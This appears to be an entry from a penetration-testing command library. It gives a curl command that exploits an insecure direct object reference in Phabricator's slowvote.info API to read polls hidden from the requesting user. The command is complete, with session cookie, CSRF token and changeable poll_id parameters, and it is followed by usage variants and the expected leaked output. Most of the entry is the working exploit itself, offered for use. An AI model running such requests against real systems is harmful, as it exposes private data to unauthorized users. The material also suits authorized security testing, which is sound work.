---
id: cmd-idor-phabricator-001
data: >-
  curl -X POST 'http://phabricator.localhost.com/api/slowvote.info' -H
  'Content-Type: application/x-www-form-urlencoded' -H 'Cookie:
  phsid=smpm4rp6yltbzna3qda2nwbomsoidzwjfshkkw7v; phusr=admin' -d
  '__csrf__=B%40wmnrkyq3468c99179280354c&__form__=1&params[poll_id]=1&output=human'
tags:
  - idor
  - api
  - curl
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:25:33.719Z'
verified: false
validated: true
submitted: true
---
# phabricator-slowvote-api-idor

## Command

```bash
curl -X POST 'http://phabricator.localhost.com/api/slowvote.info' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: phsid=smpm4rp6yltbzna3qda2nwbomsoidzwjfshkkw7v; phusr=admin' \
  -d '__csrf__=B%40wmnrkyq3468c99179280354c&__form__=1&params[poll_id]=1&output=human'
```

## Description

This curl command exploits an IDOR vulnerability in Phabricator's slowvote API by sending a POST request to retrieve details of a specific poll using its ID, bypassing visibility restrictions. Use it when testing for unauthorized access to hidden objects in Phabricator.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| poll_id | The ID of the target slowvote poll (e.g., 1) | Yes |
| __csrf__ | CSRF token for request validation (URL-encoded) | Yes |
| __form__ | Form identifier, set to 1 | Yes |
| output | Output format, set to 'human' for readable response | Yes |
| Cookie | Session cookies (phsid and phusr) for authentication | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'http://phabricator.localhost.com/api/slowvote.info' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: phsid=...; phusr=...' -d '__csrf__=...&__form__=1&params[poll_id]=1&output=human'
```

### Advanced Usage

To target a different poll, update params[poll_id]:

```bash
curl -X POST 'http://phabricator.localhost.com/api/slowvote.info' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: phsid=...; phusr=...' -d '__csrf__=...&__form__=1&params[poll_id]=42&output=human'
```

## Expected Output

A human-readable response containing the slowvote details, such as:

{
  "title": "Hidden Poll Title",
  "author": "User A",
  ... (other metadata)
}

This discloses information despite the poll being hidden from the unauthorized user.

## Related

- [[Related Procedure|Exploit-IDOR-in-Phabricator-Slowvote-API]]
